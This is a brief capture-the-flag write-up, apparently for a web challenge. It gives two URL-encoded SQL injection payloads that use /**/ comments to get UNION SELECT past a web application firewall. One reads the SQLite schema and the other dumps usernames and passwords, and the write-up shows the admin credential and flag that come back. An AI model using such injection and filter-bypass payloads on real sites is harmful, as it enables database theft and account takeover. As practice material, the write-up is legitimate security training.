Get tables

http://jh2i.com:50024/?search=noup%27/**/UNION/**/SELECT%201,2,sql,4,5%20FROM%20sqlite_master%20WHERE%20type!=%27meta%27%20AND%20sql%20NOT%20NULL%20AND%20name%20NOT%20LIKE%20%27sqlite_%%27%20--%20--

WAF bypass with union/**/select

http://jh2i.com:50024/?search=noup%27/**/UNION/**/SELECT%201,username,password,4,5%20FROM%20user--%20--

returns

```
admin
$4
NT7b#ed4$J?eZ#m_
```

Login and get flag in message

flag{check_your_WAF_rules}
